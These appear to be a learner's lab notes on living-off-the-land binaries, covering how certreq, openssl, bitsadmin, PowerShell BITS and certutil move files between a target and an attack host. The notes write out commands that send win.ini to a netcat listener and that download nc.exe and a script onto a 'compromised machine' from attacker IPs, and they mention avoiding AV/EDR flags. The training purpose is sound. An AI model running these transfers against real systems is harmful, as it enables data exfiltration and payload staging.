Living off the land binaries and scripts are legitimate binaries and scripts that can be used in nefarious ways, typical examples of functionality includes
- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses
### Using the LOLBAS and GTFOBins project
find both sites at [lolol.farm](https://lolol.farm)
##### LOLBAS
search for /upload or /download

certReq.exe is an example
in this example we would need to set up a listening port on our attack host using netcat then execute certreq.exe
##### Upload win.ini to our Pwnbox
```
C:\htb># certreq.exe -Post -config http://192.168.49.128:8080/ c:\windows\win.ini
Certificate Request Processor: The operation timed out 0x80072ee2 (WinHttp: 12002 ERROR_WINHTTP_TIMEOUT)
```
##### File Received in our Netcat Session
```
n00blyfe@htb$ sudo nc -lvnp 8080
listenon on [any] 8080 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.69] 53819
POST / HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Content-Type: application/json
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Content-Length: 92
Host: 192.168.49.128:8080

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

##### GTFOBins
to search GTFO bins search "+file download" or "+file uploads"
we'll demo using openSSL
##### Create Certificate in our Pwnbox
```
n00blyfe@htb openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem 

Generating a RSA private key .......................................................................................................+++++ ................+++++ 
writing new private key to 'key.pem' 
----- 
You are about to be asked to enter information that will be incorporated into your certificate request. 
What you are about to enter is what is called a Distinguished Name or a DN. 
There are quite a few fields but you can leave some blank 
For some fields there will be a default value, 
If you enter '.', the field will be left blank. 
----- 
Country Name (2 letter code) [AU]: 
State or Province Name (full name) [Some-State]: 
Locality Name (eg, city) []: 
Organization Name (eg, company) [Internet Widgits Pty Ltd]: 
Organizational Unit Name (eg, section) []: 
Common Name (e.g. server FQDN or YOUR name) []: 
Email Address []:
```
##### Standup the Server in our Pwnbox
```
n00blyfe@htb$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/script.sh
```

##### Download Files from Compromised Machine
```
victim@target$ openssl s_client -connect 10.10.10.32:89 -quiet > script.sh
```
### Other Common LOL tools
##### Bitsadmin download function
##### File Download with Bitsadmin
```
$S C:\htb> bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8080/nc.exe
C:\Users\htb-student\Desktop\nc.exe
```
there are also powershell modules to interact with BITS
##### Download using BITS and PowerShell
```
PS C:\htb> Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8080/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
##### Certutil
this is a defacto wget for windows however it also commonly gets flagged by AV/EDR etc
##### Download a File with Certutil
```
C:\htb> certutil.exe -verifyctl -split -f http://10.10.10.32:8080/nc.exe
```